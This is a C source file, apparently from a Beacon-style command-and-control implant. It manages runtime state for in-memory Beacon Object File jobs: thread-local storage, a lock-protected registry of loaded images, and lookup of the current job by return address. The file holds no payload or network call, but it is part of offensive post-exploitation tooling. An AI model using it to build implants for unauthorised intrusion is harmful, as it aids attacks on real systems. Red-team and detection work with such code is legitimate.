#include "beacon_bof_internal.h"

/* ===== BOF Job 运行时状态 ===== */


static INIT_ONCE g_BofRuntimeInitOnce = INIT_ONCE_STATIC_INIT;
static CRITICAL_SECTION g_BofRuntimeLock;
static DWORD g_BofTlsIndex = TLS_OUT_OF_INDEXES;
static BofJobRuntime* g_BofRuntimeList = NULL;

/* ===== BOF runtime 注册表 / 动态 TLS ===== */

static BOOL CALLBACK BofRuntimeInitOnce(PINIT_ONCE init_once, PVOID parameter, PVOID* context)
{
    (VOID)init_once;
    (VOID)parameter;
    (VOID)context;

    InitializeCriticalSection(&g_BofRuntimeLock);
    g_BofTlsIndex = TlsAlloc();

    return g_BofTlsIndex != TLS_OUT_OF_INDEXES;
}

BOOL BofRuntimeEnsureInit(VOID)
{
    return InitOnceExecuteOnce(&g_BofRuntimeInitOnce, BofRuntimeInitOnce, NULL, NULL);
}

VOID BofRuntimeSetCurrent(BofJobRuntime* runtime)
{
    if (BofRuntimeEnsureInit()) {
        TlsSetValue(g_BofTlsIndex, runtime);
    }
}

VOID BofRuntimeRegister(BofJobRuntime* runtime, PVOID image_base, SIZE_T image_size)
{
    if (!runtime || !image_base || image_size == 0 || !BofRuntimeEnsureInit()) return;

    EnterCriticalSection(&g_BofRuntimeLock);
    runtime->image_base = image_base;
    runtime->image_size = image_size;
    runtime->next = g_BofRuntimeList;
    g_BofRuntimeList = runtime;
    runtime->registered = 1;
    LeaveCriticalSection(&g_BofRuntimeLock);
}

VOID BofRuntimeUnregister(BofJobRuntime* runtime)
{
    BofJobRuntime** pp;

    if (!runtime || !runtime->registered || !BofRuntimeEnsureInit()) return;

    EnterCriticalSection(&g_BofRuntimeLock);
    pp = &g_BofRuntimeList;
    while (*pp) {
        if (*pp == runtime) {
            *pp = runtime->next;
            break;
        }
        pp = &(*pp)->next;
    }
    runtime->next = NULL;
    runtime->registered = 0;
    LeaveCriticalSection(&g_BofRuntimeLock);
}

BofJobRuntime* BofGetCurrentRuntime(PVOID return_address)
{
    BofJobRuntime* runtime = NULL;
    ULONG_PTR addr = (ULONG_PTR)return_address;

    if (!BofRuntimeEnsureInit()) return NULL;

    /* 首选动态 TLS：BOF 入口线程由加载器创建时会写入当前 runtime。 */
    runtime = (BofJobRuntime*)TlsGetValue(g_BofTlsIndex);
    if (runtime) return runtime;

    if (!return_address) return NULL;

    /*
     * fallback：部分 BOF 可能自己创建线程，TLS 不一定被继承。
     * 此时用调用 Beacon API 的返回地址反查其所属 BOF 映射区间。
     */
    EnterCriticalSection(&g_BofRuntimeLock);
    for (runtime = g_BofRuntimeList; runtime; runtime = runtime->next) {
        ULONG_PTR base = (ULONG_PTR)runtime->image_base;
        ULONG_PTR end = base + runtime->image_size;
        if (addr >= base && addr < end) {
            break;
        }
    }
    LeaveCriticalSection(&g_BofRuntimeLock);

    return runtime;
}

BeaconContext* BofRuntimeGetContext(BofJobRuntime* runtime)
{
    return runtime ? runtime->ctx : NULL;
}

UINT32 BofRuntimeGetTaskId(BofJobRuntime* runtime)
{
    return runtime && runtime->job ? runtime->job->task_id : 0;
}

HANDLE BofRuntimeGetStopEvent(BofJobRuntime* runtime)
{
    return runtime ? runtime->stop_event : NULL;
}

